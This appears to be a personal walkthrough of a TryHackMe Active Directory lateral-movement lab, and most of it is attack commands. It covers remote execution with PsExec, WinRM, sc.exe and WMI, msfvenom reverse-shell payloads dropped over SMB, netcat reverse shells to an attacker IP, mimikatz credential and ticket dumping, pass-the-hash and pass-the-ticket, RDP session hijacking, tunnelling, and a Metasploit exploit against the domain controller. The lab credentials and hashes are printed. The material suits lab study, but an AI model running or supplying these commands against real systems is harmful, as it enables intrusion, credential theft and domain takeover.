'''scope
THMDC - 10.200.71.101
Initial Credentials - http://distributor.za.tryhackme.com/creds
Elevated Credentials - http://distributor.za.tryhackme.com/creds_t2 
'''

## Exploitaiton:
- Added the DNS IP address of THMDC in `/etc/systemd/resolved.conf`
- Restarted the service
```bash
systemctl restart systemd-resolved
```

- If this didnt work revert the file `/etc/systemd/resolved.conf` to normal and add the IP in `/etc/resolv.conf` in nameserver
- Got the credentials
	barbara.taylor:Knockers2015?
---------------------------------------------------------------------------------
- This is assumed breach so we have admin creds as well
	ZA.TRYHACKME.COM\t1_leonard.summers:EZpass4ever
- Got in using
```bash
ssh za\\barbara.taylor@thmjmp2.za.tryhackme.com
```

- We can see the methods we can use to gain a shell on the system
- `Psexec`
- We can use `psexec` to get a shell on port 445 (SMB) on THMIIS Server using out THMJMP2 machine which we have SSH access to and we can try kali machine as well
```bash
# Windows
.\PsExec64.exe \\thmiis.za.tryhackme.com -u t1_leonard.summers -p EZpass4ever -i cmd.exe 

# Kali
psexec.py t1_leonard.summers@10.200.71.201 
```

- `WinRM`
- We can use WinRM to get shell as well
```bash
# CMD
winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com cmd 

# Powershell
$username = 't1_leonard.summers'
$password = 'EZpass4ever'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Enter-PSSession -Computername thmiis.za.tryhackme.com -Credential $credential
Invoke-Command -Computername thmiis.za.tryhackme.com -Credential $credential -ScriptBlock {ipconfig}

# Kali
evil-winrm -i 10.200.71.201 -u "t1_leonard.summers" -p "EZpass4ever"
```

- `SC.exe`
- We can create services and execute them giving us shell from other users/computers
```bash
sc.exe \\thmiis.za.tryhackme.com create THMservice-cryptoace binPath= "net user cryptoace Password123! /add" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-cryptoace
```

- Another way to do it is
```bash
# On kali
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.97 LPORT=9001 -o cryptoace.exe
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 9001;exploit"

# On Windows
smbclient -c 'put cryptoace.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/'
```

- Right now we are logged on using `barbara.taylor`. To get a session of t1_leonard.summers we can use `runas`
```bash
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.65.97 4443"
```

- Now we can upload and start our service
```bash
sc.exe \\thmiis.za.tryhackme.com create THMservice-cryptoace binPath= "%windir%\cryptoace.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-cryptoace
```

- And we get a shell on our `msfconsole`
---------------------------------------------------------------------------------
- This is assumed breach so we have admin creds as well
	ZA.TRYHACKME.COM\t1_corine.waters:Korine.1994
- We can use WMI to get a shell as well
- On kali machine
```bash
# On kali
wmiexec.py t1_corine.waters@thmiis.za.tryhackme.com
```

- On windows we can use these methods
- First we create a `$Session` variable
```bash
# On Windows
$username = 't1_corine.waters'
$password = 'Korine.1994'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

- We can use WMI to spawn remote processes
```bash
$Command = "powershell.exe -Command Set-Content -Path C:\crypt0ace.txt -Value cryptoacewashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

- We can use WMI to create and start services
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "cryptoace";
DisplayName = "cryptoace";
PathName = "net user cryptoace Password123! /add";
ServiceType = [byte]::Parse("16");
StartMode = "Manual"
}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'cryptoace'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

- We can use WMI to create scheduled takes
```bash
$Command = "cmd.exe"
$Args = "/c net user cryptoace Password123! /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "cryptoace"
Start-ScheduledTask -CimSession $Session -TaskName "cryptoace"
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

- If we have a MSI package on the target we can use WMI to execute it
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\cryptoace.msi"; Options = ""; AllUsers = $false}
```

- Another way to do it
```bash
# On kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=443 -f msi > cryptoace.msi
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 443;exploit"

# On Windows
smbclient -c 'put cryptoace.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/'
```

- We can then start it using
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\cryptoace.msi"; Options = ""; AllUsers = $false}
```

- And we get a shell on our `msfconsole`
---------------------------------------------------------------------------------
- This is assumed breach so we have creds for THMJMP2 as well
	A.TRYHACKME.COM\t2_felicia.dean:iLov3THM!

- Got in using
```bash
ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
```

- `PASS-THE-HASH`
- We need the hash of the required user
```bash
.\mimikatz.exe
privilege::debug
token::elevate

sekurlsa::msv
```

- Found user `t1_toby.beck` hash
```bash
533f1bd576caa912bdb9da284bbc60fe
```

- We can use these methods to pass the hash using linux box
```bash
evil-winrm -i 10.200.71.201 -u 't1_toby.beck' -H '533f1bd576caa912bdb9da284bbc60fe'

psexec.py -hashes 533f1bd576caa912bdb9da284bbc60fe:533f1bd576caa912bdb9da284bbc60fe t1_toby.beck@10.200.71.201

xfreerdp /v:10.200.71.201 /u:za\\t1_toby.beck /pth:533f1bd576caa912bdb9da284bbc60fe
```

- Another way to do it
- We already have thh required hash
- We can use `mimikatz.exe` 
```bash
token::revert # Cant work with elevated privileges

sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.97 5555"

# On kali
nc -lvnp 5555
```

- And we get a shell
- `PASS-THE-TICKET`
- We can use `mimiaktz.exe` to extract kerberos tickets or session keys as well
```bash
privilege::debug
sekurlsa::tickets /export 
```

- If we find desired ticket we can use it (its in the form of [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi)
```bash
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

- `OVERPASS-THE-HASH/PASS-THE-TICKET`
- We can use `mimikatz.exe` to pass the keys as well
```bash
sekurlsa::ekeys
```

- Depending on the keys we find we can use these methods
- If we have the AES256 hash:
```bash
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:8a1682a496bb4cea2685cbb3e660ddf1a7c49f8b1892870f906040ce92417f80 /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.97 5556"

# On kali
nc -lvnp 5556
```

- We can use AES256	here because the RC4 hashes are equal to NTLM hashes
- We get a shell
- Once we have a shell using all these methods we can start a command prompt on THMIIS without providing password because we already have that injected
```bash
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```
---------------------------------------------------------------------------------
- Got elevated credentials from http://distributor.za.tryhackme.com/creds_t2
	t2_kelly.blake:8LXuPeNHZFFG
- Used `xfreerdp` to login
```bash
xfreerdp /u:"t2_kelly.blake" /p:'8LXuPeNHZFFG' /v:thmjmp2.za.tryhackme.com +clipboard /dynamic-resolution
```

- We can open `cmd.exe` as Administrator
- We can use `psexec64.exe` to open a `NT AUTHORITY/SYSTEM`
```bash
psexec64.exe -s cmd.exe
```

- We can use these commands to check sessions we can hijack
```bash
query user
query session
```

- The sessions with `DISC` state are hijackable
- We can hijack active sessions too but they will force the user out and that is sus
- We can use
```bash
tscon 3 /dest:rdp-tcp#52
```

- 3 is the ID
- We get a new session
---------------------------------------------------------------------------------
- Need to create a SSH tunnel so will create a user for it
```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser # s0XNbTecE5WARK9ddz5usR
```

- We need to access RDP on THMIIS but it can only be accessed from THMJMP2
- We need to add firewall rules
```bash
netsh advfirewall firewall add rule name="Open Port 9001" dir=in action=allow protocol=TCP localport=9001
```

- We can use socat to make a port forwarding connection
```bash
socat TCP4-LISTEN:9001,fork TCP4:10.200.71.201:3389
```

- Now we can access RDP on THMIIS on port 9001 at THMJMP2
```bash
xfreerdp /v:THMJMP2.za.tryhackme.com:9001 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

- Got in
- We have a vulnerable Rejetto HFS running on THMDC
- It can only be accessed from THMJMP2
- But THMDC only allows outbound connections from machines in local network
- And the exploit needs to have a webserver for the exploit to work but we cant run it on our kali machine because it cant connect to THMDC
- We need to do many port forwards here

```bash
ssh tunneluser@10.50.65.97 -R 8888:thmdc.za.tryhackme.com:80 -L *:1233:127.0.0.1:1233 -L *:5566:127.0.0.1:5566 -N
```

- Now we are getting out THMDC port 80 over to our port 8888 and our ports 1233 and 5566 are being sent to THMJMP2
- Used `msfconsole` with these commands
```bash
use windows/http/rejetto_hfs_exec
set lhost thmjmp2.za.tryhackme.com
set ReverseListenerBindAddress 127.0.0.1
set lport 5566

set srvhost 127.0.0.1
set srvport 1233

set rhosts 127.0.0.1
set rport 8888
run
```

- Got in to THMDC!